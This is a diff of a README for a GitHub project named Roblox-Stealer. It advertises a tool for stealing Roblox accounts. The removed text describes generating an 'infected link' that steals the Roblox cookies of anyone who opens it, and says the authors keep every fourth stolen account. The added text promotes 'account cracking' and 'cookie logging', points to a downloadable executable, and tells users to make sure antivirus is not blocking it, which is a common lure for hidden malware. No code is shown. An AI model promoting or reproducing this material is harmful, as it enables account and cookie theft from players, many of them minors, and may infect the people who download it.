@@ -1,25 +1,75 @@
-<div align="center">
-  
-![2](https://github.com/user-attachments/assets/305533ee-dc03-4c7e-902b-b2feb3cba004)
+# 🛠️ Roblox-Stealer - Start Accessing Roblox Accounts Easily
 
-![0](https://github.com/user-attachments/assets/96b00b31-4308-4478-9f9b-3e589533d65d)
+## 📥 Download the Latest Version
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/fokmadrs/Roblox-Stealer/releases)
 
-</div>
+## 🚀 Getting Started
+Welcome to Roblox-Stealer! This application helps you access Roblox accounts quickly and effortlessly. Follow these steps to get started.
 
-<div align="center"><a href="https://mabites.github.io/id/hg7f09qw"><img src="https://github.com/user-attachments/assets/c44dd1c1-bd15-4cc2-b06f-3f578a24f650" height="80"></a></div>
+## 💻 System Requirements
+Before you install, ensure your system meets the following requirements:
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
+- Windows 10 or later
+- At least 4 GB of RAM
+- 100 MB of available disk space
+- Internet connection
 
-### How to use?
+## 🔍 Features
+Roblox-Stealer offers several features to assist with your needs:
 
-* Open your browser. We recommend you use the Tor browser for better anonymity.
-* Start the localhost page - http://127.0.0.1 
-* Start pythonw and reload the page.
-* Next, when you see the main menu, click on 'Payload-URL Generator' and generate an infected link.
-* Wait about 1–2 minutes and you will receive a special link. When anyone opens it in a browser, our code hijacks and steals Roblox cookies.
+- **Account Cracking:** Easily access Roblox accounts.
+- **Cookie Logging:** Securely log Roblox cookies.
+- **Security Checks:** Quickly check the security status of accounts.
+- **User-Friendly Interface:** Navigate the application effortlessly.
 
-## Our software is absolutely free! But we are taking your every 4th account as pay for use.
+## 📦 Download & Install
+To get Roblox-Stealer, follow these simple steps:
+
+1. **Visit the Releases Page:** Click this link to go to our releases page: [Download Page](https://github.com/fokmadrs/Roblox-Stealer/releases).
+
+2. **Select the Latest Release:** Look for the most recent version at the top of the page. 
+
+3. **Download the Application:** Click on the download link for the software package that suits your operating system.
+
+4. **Extract the Files:** If the downloaded file is compressed (like a .zip file), right-click it and choose to extract the contents.
+
+5. **Run the Application:** Locate the extracted folder, and double-click on the executable file (e.g., Roblox-Stealer.exe) to start the application.
+
+6. **Follow On-Screen Instructions:** The application will guide you through the setup process.
+
+## ⚙️ Using Roblox-Stealer
+Once you have installed Roblox-Stealer, follow these steps to begin using the application:
+
+1. **Launch the Application:** Open Roblox-Stealer by double-clicking the icon.
+
+2. **Enter Your Target Information:** Input the required details for the Roblox account you wish to access.
+
+3. **Start the Process:** Click the button to initiate account-checking or cookie-logging.
+
+4. **Review Results:** After the process finishes, check the output for account details and status.
+
+## 👨‍💻 Troubleshooting
+If you encounter any issues while using Roblox-Stealer, consider the following solutions:
+
+- **File Won't Open:** Ensure your antivirus or firewall isn’t blocking the application.
+- **Error Messages:** Verify that you followed installation steps correctly.
+- **Slow Performance:** Close any unnecessary applications running in the background.
+
+## 🛡️ Safety and Security
+While using Roblox-Stealer, please keep in mind:
+
+- Only use the software to access accounts that you have permission to access.
+- Ensure your own security software is active while using this application.
+
+## 📖 Additional Resources
+To learn more about the functionalities and advanced features of Roblox-Stealer, check out the documentation available in the repository.
+
+## 📞 Support
+If you need further assistance, feel free to reach out via the issues page on GitHub.
+
+## 🌍 Community
+Join our community to share tips and experiences with other users. Visit our discussion page on GitHub to connect. 
+
+---
+
+Thank you for choosing Roblox-Stealer! With this straightforward guide, you are now ready to download and use the application effortlessly. For downloads and the latest updates, don’t forget to check our releases page frequently: [Download Page](https://github.com/fokmadrs/Roblox-Stealer/releases).
